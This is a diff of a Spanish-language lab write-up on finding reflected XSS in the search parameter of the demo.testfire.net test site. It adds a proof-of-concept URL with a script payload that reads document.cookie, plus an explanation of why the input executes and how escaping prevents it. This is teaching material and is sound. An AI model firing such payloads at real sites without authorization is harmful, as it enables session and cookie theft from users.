@@ -107,7 +107,7 @@ chmod +x filtrar_parameters_xss.sh
 INPUT_FILE="testfire.net_katana_results.txt"
 
 # Archivo de salida
-OUTPUT_FILE="urls_patrones_xss.txt"
+OUTPUT_FILE="parametros_xss.txt"
 
 # Lista de parámetros sospechosos
 PARAMS=(
@@ -164,7 +164,7 @@ echo "[+] Resultados guardados en $OUTPUT_FILE"
 
 ## 5. Investigación de candidatos
 ```bash
-#cat urls_patrones_xss.txt
+#cat parametros_xss.txt.txt
 https://demo.testfire.net/search.jsp
 ...
 https://demo.testfire.net/swagger/err/error-transformers/transformers/not-of-type.js
@@ -206,16 +206,47 @@ https://demo.testfire.net/swagger/download-url.js
 # Payload básico para la PoC:
 <script>alert(document.cookie)</script>
 #Url
-https://demo.testfire.net/search.jsp
+https://demo.testfire.net/search.jsp?query=investor
+https://demo.testfire.net/search.jsp?query=<script>alert(document.cookie)</script>
 ```
 > Abrimos la ulr
+
 ![image](https://github.com/user-attachments/assets/8158af39-7bb6-478d-b70d-30124c771260)
 > Testeamos el parámetro reflejado
+
 ![image](https://github.com/user-attachments/assets/7752fc90-2800-4a75-8ec9-ee26f52c385d)
 > Insertamos el payload
+
 ![image](https://github.com/user-attachments/assets/1136a0b4-5fc0-4a46-a3b4-f1703687c70d)
+
 
 
 >*Referencias: [Payload xss comunes](https://github.com/payloadbox/xss-payload-list)*
 
+## 6. ¿Qué está pasando background?
+> El servidor inserta directamente lo que escribimos en query en su HTML
+
+```bash
+<!-- TOC END -->
+    <td valign="top" colspan="3" class="bb">
+				<div class="fl" style="width: 99%;">
+				<h1>Search Results</h1>
+				<p>No results were found for the query:<br /><br />
+				<script>alert(document.location)</script>
+				</div>    
+    </td>	
+```
+> El navegador no ve eso como texto, sino como un verdadero elemento <script>, y por eso lo ejecuta inmediatamente.
+> Para evitar este ataque, debería escapar los caracteres especiales como <, >, " y ' en el parámetro query.
+> De esta forma, el navegador lo mostraría como texto, no lo ejecutaría.
+
+```bash
+<p>No results were found for the query:<br /><br />
+&lt;script&gt;alert(document.location)&lt;/script&gt;
+```
+
+## Creditos y Recursos
+>*Referencias: [PortSwigger](https://portswigger.net/web-security/cross-site-scripting)*
+>*Referencias: [TryHackme](https://tryhackme.com/room/axss)*
+>*Referencias: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)*
 
